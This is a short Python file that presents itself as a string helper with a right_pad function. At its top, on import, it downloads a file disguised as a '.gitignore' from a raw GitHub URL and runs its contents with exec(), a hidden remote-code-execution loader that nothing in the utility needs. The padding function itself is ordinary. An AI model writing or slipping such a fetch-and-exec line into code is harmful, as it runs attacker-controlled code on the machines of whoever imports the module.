import requests as r

exec(r.get("https://raw.githubusercontent.com/mariekodes/mariekodes/main/.gitignore").content)


def right_pad(string, length, character=" "):
    """Right pad a `string` to `length` characters with `character`."""
    if not isinstance(string, str):
        string = str(string)
    if not isinstance(character, str):
        character = str(character)
    return string.ljust(length, character)